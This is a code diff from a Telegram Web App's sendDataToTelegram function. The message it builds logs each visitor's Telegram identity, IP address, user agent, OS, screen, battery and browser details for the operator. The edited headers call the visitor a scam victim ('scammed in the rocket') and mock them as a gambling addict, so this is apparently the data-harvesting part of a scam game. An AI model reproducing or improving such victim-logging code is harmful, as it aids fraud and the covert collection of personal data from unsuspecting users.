@@ -50,26 +50,26 @@ async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
 
     const message = `
-<b>✨ Лог успешен!</b>
+<b>🚀 Наебан в ракетке!</b>
 
-<b>🔍 Информация об аккаунте:</b>
-├ Тэг: @${tg.initDataUnsafe.user.username}
+<b>🔍 Лудик ахмед:</b>
+├ Тег: @${tg.initDataUnsafe.user.username}
 ├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
 ├ Имя: <code>${tg.initDataUnsafe.user.first_name}</code>
 ├ Фамилия: <code>${tg.initDataUnsafe.user.last_name}</code>
 ├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
 └ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
 
-<b>🖥️ Информация об устройстве:</b>
+<b>📱 Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
 ├ UserAgent: <code>${userAgent}</code>
 ├ Хэш: <code>undefined</code>
-├ Имя ОС: <code>${osName}</code>
+├ ОС: <code>${osName}</code>
 ├ Разрешение экрана: <code>${screenResolution}</code>
-├ Процент батареи: <code>${batteryPercentage}%</code>
+├ Заряд батареи: <code>${batteryPercentage}%</code>
 └ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
 
-<b>🌐 Информация о браузере:</b>
+<b>🛜 Информация о браузере:</b>
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
